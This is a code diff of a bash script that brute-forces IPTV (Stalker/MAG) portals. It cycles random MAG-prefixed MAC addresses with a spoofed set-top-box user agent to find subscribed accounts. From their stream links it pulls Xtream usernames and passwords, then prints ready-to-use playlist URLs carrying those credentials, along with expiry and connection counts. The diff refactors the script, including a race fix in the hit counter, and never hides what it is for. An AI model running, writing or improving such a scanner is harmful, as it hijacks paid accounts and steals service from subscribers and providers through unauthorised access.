@@ -14,13 +14,6 @@ LIGHT_BLUE=$'\033[0;94m'
 RESET=$'\033[0m'
 CLEAR_LINE=$'\033[2K'
 
-# Choose grep implementation: ggrep on macOS, grep elsewhere
-if [[ "$(uname)" == "Darwin" ]]; then
-    GREP="ggrep"
-else
-    GREP="grep"
-fi
-
 UA="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG250 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
 # Very-low per-request timeout: blocked/ratelimited IPs hang ~12s before closing;
 # fail fast and ignore such responses instead of stalling workers.
@@ -47,80 +40,85 @@ progress() {
 }
 
 scan_mac() {
+  token_pat='"token":"'
   while true; do
     read -r current_count < "$success_file"
     ((current_count >= max_success_count)) && break
 
     MAC="00:1A:79:${hex[RANDOM%16]}${hex[RANDOM%16]}:${hex[RANDOM%16]}${hex[RANDOM%16]}:${hex[RANDOM%16]}${hex[RANDOM%16]}"
+    cookie="mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;"
 
     response=$(curl -s -i --max-time $SCAN_TIMEOUT \
       -H "User-Agent: $UA" \
-      -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
+      -H "Cookie: $cookie" \
       "$URL/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml")
     # 000 / non-200 handshake (blocked, ratelimited, ...): show, try next MAC
-    if ! echo "$response" | $GREP -q "200"; then
+    if [[ $response != *"200"* ]]; then
       progress "scanning: $MAC [${RED}connection failed, ratelimited?${RESET}]"
       continue
     fi
 
-    token=$(echo "$response" | $GREP -oP '(?<="token":")[^"]*')
+    token=""
+    if [[ $response == *"$token_pat"* ]]; then
+      token=${response#*"$token_pat"}
+      token=${token%%'"'*}
+    fi
 
     curl -s -o /dev/null --max-time $SCAN_TIMEOUT \
       -H "User-Agent: $UA" \
-      -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
+      -H "Cookie: $cookie" \
       -H "Authorization: Bearer $token" \
       "$URL/portal.php?type=stb&action=get_profile&auth_second_step=1&hw_version_2=1635b1c3e68859923ab3bb72192e089f66e7dd9e&JsHttpRequest=1-xml"
 
-    genres=$(curl -s --max-time $SCAN_TIMEOUT \
+    if ! curl -s --max-time $SCAN_TIMEOUT \
       -H "User-Agent: $UA" \
-      -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
+      -H "Cookie: $cookie" \
       -H "Authorization: Bearer $token" \
-      "$URL/portal.php?type=itv&action=get_genres&JsHttpRequest=1-xml")
-
-    if ! echo "$genres" | jq -e '.js[] | select(.title == "All")' > /dev/null 2>&1; then
+      "$URL/portal.php?type=itv&action=get_genres&JsHttpRequest=1-xml" \
+      | jq -e '.js[] | select(.title == "All")' > /dev/null 2>&1; then
       progress "scanning: $MAC [connected but no subscriptions.]"
       continue
     fi
 
-    main_info=$(curl -s --max-time $SCAN_TIMEOUT \
+    mac_phone=$(curl -s --max-time $SCAN_TIMEOUT \
       -H "User-Agent: $UA" \
-      -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
+      -H "Cookie: $cookie" \
       -H "Authorization: Bearer $token" \
-      "$URL/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml")
-    mac_phone=$(echo "$main_info" | jq -r '.js | "\(.mac) [\(.phone)]"')
+      "$URL/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml" \
+      | jq -r '.js | "\(.mac) [\(.phone)]"')
 
     ffplay=$(curl -s --max-time $SCAN_TIMEOUT \
       -H "User-Agent: $UA" \
-      -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
+      -H "Cookie: $cookie" \
       -H "Authorization: Bearer $token" \
       "$URL/portal.php?type=itv&action=create_link&cmd=$channel&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml" \
-      | jq -r 'try .js.cmd // .js[0].cmd // empty' 2>/dev/null | sed 's/^ffmpeg //')
+      | jq -r 'try .js.cmd // .js[0].cmd // empty' 2>/dev/null)
+    ffplay=${ffplay#ffmpeg }
 
-    xtreamuser=$(echo "$ffplay" | awk -F/ '{print $4}')
-    xtreampw=$(echo "$ffplay" | awk -F/ '{print $5}')
+    # http://host/user/pass/... -> user=$4, pass=$5 when split on "/"
+    IFS=/ read -r _ _ _ xtreamuser xtreampw _ <<< "$ffplay"
 
-    check=$(curl -s --max-time $SCAN_TIMEOUT "$URL/player_api.php?username=$xtreamuser&password=$xtreampw" | jq -r '.user_info')
-    exp_date=$(echo "$check" | jq -r '.exp_date')
-    max_connections=$(echo "$check" | jq -r '.max_connections')
-    active_cons=$(echo "$check" | jq -r '.active_cons')
+    read -r exp_date max_connections active_cons <<< \
+      "$(curl -s --max-time $SCAN_TIMEOUT "$URL/player_api.php?username=$xtreamuser&password=$xtreampw" \
+        | jq -r '[.user_info | .exp_date, .max_connections, .active_cons] | join(" ")')"
 
     live=$(curl -s --max-time $SCAN_TIMEOUT \
       -H "User-Agent: $UA" \
-      -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
+      -H "Cookie: $cookie" \
       -H "Authorization: Bearer $token" \
       "$URL/portal.php?type=itv&action=get_ordered_list&genre=*&fav=0&sortby=name&p=1&JsHttpRequest=1-xml" \
       | jq -r 'try (.js.total_items // .js[0].total_items) // 0' 2>/dev/null)
 
     vod=$(curl -s --max-time $SCAN_TIMEOUT \
       -H "User-Agent: $UA" \
-      -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
+      -H "Cookie: $cookie" \
       -H "Authorization: Bearer $token" \
       "$URL/portal.php?type=vod&action=get_ordered_list&category=*&sortby=added&fav=0&p=1&JsHttpRequest=1-xml" \
       | jq -r 'try (.js.total_items // .js[0].total_items) // 0' 2>/dev/null)
 
     series=$(curl -s --max-time $SCAN_TIMEOUT \
       -H "User-Agent: $UA" \
-      -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
+      -H "Cookie: $cookie" \
       -H "Authorization: Bearer $token" \
       "$URL/portal.php?type=series&action=get_ordered_list&category=*&sortby=added&fav=0&p=1&JsHttpRequest=1-xml" \
       | jq -r 'try (.js.total_items // .js[0].total_items) // 0' 2>/dev/null)
@@ -132,15 +130,19 @@ scan_mac() {
         printf '%s  -> %s/get.php?username=%s&password=%s&type=m3u_plus [max=%s active=%s]%s\n' \
           "$LIGHT_BLUE" "$URL" "$xtreamuser" "$xtreampw" "$max_connections" "$active_cons" "$RESET"
       printf "%s|%s|%s|%s\n" "$MAC" "$live" "$vod" "$series" >> "$hit_file"
+      # Increment under the lock: a read-modify-write outside the lock
+      # loses increments when two workers race on the same value.
+      read -r current_count < "$success_file"
+      echo $((current_count + 1)) > "$success_file"
     } 200>"$success_file.lock"
 
-    echo $((current_count + 1)) > "$success_file"
-    read -r current_count < "$success_file"
-    ((current_count >= max_success_count)) && { printf '%sTarget reached: %s MACs found.%s\n' "$LIGHT_BLUE" "$max_success_count" "$RESET"; break; }
+    ((current_count + 1 >= max_success_count)) && { printf '%sTarget reached: %s MACs found.%s\n' "$LIGHT_BLUE" "$max_success_count" "$RESET"; break; }
   done
 }
 
 pids=()
+trap 'kill "${pids[@]}" 2>/dev/null; wait "${pids[@]}" 2>/dev/null; show_summary; exit 1' INT TERM
+
 for ((i=0; i<num_workers; i++)); do
   scan_mac &
   pids+=($!)
@@ -156,8 +158,6 @@ show_summary() {
   fi
   rm -f "$success_file" "$success_file.lock" "$hit_file"
 }
-
-trap 'kill "${pids[@]}" 2>/dev/null; wait "${pids[@]}" 2>/dev/null; show_summary; exit 1' INT TERM
 
 wait
 show_summary
